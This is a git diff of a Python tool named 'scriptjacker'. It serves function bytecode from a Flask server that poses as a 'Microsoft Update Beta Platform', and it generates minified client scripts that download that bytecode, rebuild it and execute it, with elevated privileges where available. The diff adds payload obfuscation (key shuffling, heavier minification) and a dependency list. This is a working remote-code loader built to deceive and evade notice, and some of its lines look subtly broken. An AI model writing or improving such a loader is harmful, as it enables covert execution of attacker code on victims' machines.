@@ -1,10 +1,13 @@
-import click
-import subprocess as sp
-import shutil
 import os
-import encoders
-import bytemanip as bm
+import random
+import shutil
+import subprocess as sp
+
+import click
 from flask import Flask, jsonify
+
+import bytemanip as bm
+import encoders
 
 click.arg = click.argument
 app = Flask("Microsoft Update Beta Platform")  # Windows insider
@@ -21,8 +24,8 @@ def exegen(output):
 
 
 def pygen(output, sysargv="sys.argv"):
-    if s == None:
-        with open("bytemanip.py") as f:
+    if True:
+        with open(__file__.removesuffix("scriptjacker.py") + "bytemanip.py") as f:
             bytemanip = f.read()
         s = bytemanip
         s += """\nimport requests
@@ -30,13 +33,14 @@ cont=requests.get("$$$$ip$$$$").json()
 class abc:
     def __init__(c,argcount,posonlyargcount,kwonlyargcount,nlocals,stacksize,flags,consts,names,varnames,filename,name,firstlineno,lnotab,freevars,cellvars):
         (c.co_argcount, c.co_posonlyargcount, c.co_kwonlyargcount,
-                    c.co_nlocals, c.co_stacksize, c.co_flags,c.co_consts, c.co_names, 
-                    c.co_varnames,  c.co_filename, c.co_name, 
+                    c.co_nlocals, c.co_stacksize, c.co_flags,c.co_consts, c.co_names,
+                    c.co_varnames,  c.co_filename, c.co_name,
                     c.co_firstlineno, c.co_lnotab, c.co_freevars, c.co_cellvars)=argcount,posonlyargcount,kwonlyargcount,nlocals,stacksize,flags,tuple(consts),tuple(names),tuple(varnames),filename,name,firstlineno,lnotab.encode(),tuple(freevars),tuple(cellvars)
         c.co_const=c.co_consts
 c=abc(*cont["cont"])
 f=lambda:None
 bl=assemble(cont["cl"],c)
+deps=cont.deps
 code=create_injection(c,bl)
 f.__code__=code
 import ctypes, sys
@@ -49,6 +53,7 @@ def is_admin():
 
 if is_admin():
     try:
+
         f()
     except Exception as e:
         pass
@@ -63,7 +68,7 @@ else:
     s = s.replace("$$$$ip$$$$", ip)
     with open("temp.py", "w") as f:
         f.write(s)
-    sp.run("pyminifier temp.py > " + output, shell=True)
+    sp.run("pyminifier -O --replacement-length=7 temp.py > " + output, shell=True)
     sp.run("del temp.py", shell=True)
     with open(output) as f:
         s = f.readlines()[:-2]
@@ -105,6 +110,11 @@ def server(port):
     os.chdir(src)
     function = input("Please enter your function name: ")
     function = getattr(__import__("essential_to_scriptjacker_do_not_delete"), function)
+    deps = (
+        input("Please enter a comma-seperated list of dependencies: ")
+        .replace(" ", "")
+        .split(",")
+    )
     # Disassemble function
     c = function.__code__
     bl = bm.disassemble_to_list(c)
@@ -128,8 +138,12 @@ def server(port):
             c.co_cellvars,
         ],
         "cl": bl,
+        "deps": deps,
     }
     json = encoders.stuffjson(json)
+    jl = list(json.items())
+    random.shuffle(jl)
+    json = dict(jl)
 
     @app.route("/")
     def home():
